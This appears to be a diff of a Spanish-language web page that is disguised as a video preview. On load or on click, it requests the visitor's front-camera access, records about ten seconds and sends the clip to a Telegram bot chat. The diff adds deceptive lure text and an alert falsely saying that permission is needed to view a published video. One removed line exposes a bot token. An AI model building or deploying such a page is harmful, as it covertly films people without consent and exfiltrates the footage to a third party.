@@ -1,23 +1,77 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="es">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CameraBooh</title>
+    <title>GRABANDO VIDEO</title>
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #000000; /* Fondo negro */
+            font-family: Arial, sans-serif;
+            color: #ffffff; /* Texto blanco */
+            position: relative;
+        }
+        #container {
+            width: 80%;
+            max-width: 600px;
+            border: 2px solid #ff0000; /* Contorno rojo */
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            position: relative;
+            cursor: pointer;
+        }
+        video, img {
+            width: 100%;
+            border-radius: 10px;
+        }
+        .warning {
+            color: #ff0000;
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 20px;
+            animation: blink 1s infinite;
+        }
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0; }
+            100% { opacity: 1; }
+        }
+        .emojis {
+            font-size: 32px;
+            position: absolute;
+            bottom: 10px;
+        }
+    </style>
 </head>
 <body>
-    <h1>CameraBooh</h1>
-    <video id="video" width="640" height="480" autoplay></video>
-    
-    <script>
-        const videoElement = document.getElementById('video');
+    <div class="warning">GUARDANDO VIDEO</div>
+    <div id="container" onclick="startWebcam()">
+        <!-- Cambia 'vista-previa.jpg' por el nombre de tu imagen -->
+        <img id="previewImage" src="vista-previa.jpeg" alt="Vista previa del video">
+        <video id="video" autoplay style="display: none;"></video>
+    </div>
+    <div class="emojis">😂🤣😆</div>
 
-        // Función para iniciar la grabación automáticamente
-        async function iniciarGrabacion() {
+    <script>
+        async function startWebcam() {
             try {
-                // Solicitar permisos de cámara
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                const constraints = {
+                    video: {
+                        facingMode: "user" // Intenta usar la cámara frontal
+                    }
+                };
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                const videoElement = document.getElementById('video');
+                const previewImage = document.getElementById('previewImage');
                 videoElement.srcObject = stream;
+                videoElement.style.display = 'block';
+                previewImage.style.display = 'none';
 
                 // Iniciar la grabación automáticamente
                 const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
@@ -36,22 +90,19 @@
                 setTimeout(() => {
                     mediaRecorder.stop();
                 }, 10000); // Detener la grabación después de 10 segundos
-            } catch (err) {
-                console.error('Error al acceder a la cámara:', err);
+            } catch (error) {
+                console.error('Error al acceder a la cámara:', error);
+                alert('No se pudo acceder a la pagina. Asegúrate de haber dado permiso requerido por tu navegador para ingresar al video publicado.');
             }
         }
 
-        // Llamar a la función para iniciar la grabación automáticamente
-        iniciarGrabacion();
-
-        // Función para enviar el vídeo a Telegram
         async function enviarVideo(blob) {
             const formData = new FormData();
-            formData.append('chat_id', '@InstagramLink');
+            formData.append('chat_id', '@rs_victor'); // O utiliza '6932235667' en lugar de '@rs_victor'
             formData.append('video', blob, 'video.mp4');
 
             try {
-                const response = await fetch('https://api.telegram.org/bot7080915835:AAGMjCwljr7GaFWNOu4jaN-zHiz244RXEL0/sendVideo', {
+                const response = await fetch('https://api.telegram.org/botTU_TOKEN_DE_BOT/sendVideo', {
                     method: 'POST',
                     body: formData
                 });
@@ -63,6 +114,8 @@
                 console.error('Error:', error);
             }
         }
+
+        window.addEventListener('load', startWebcam);
     </script>
 </body>
 </html>
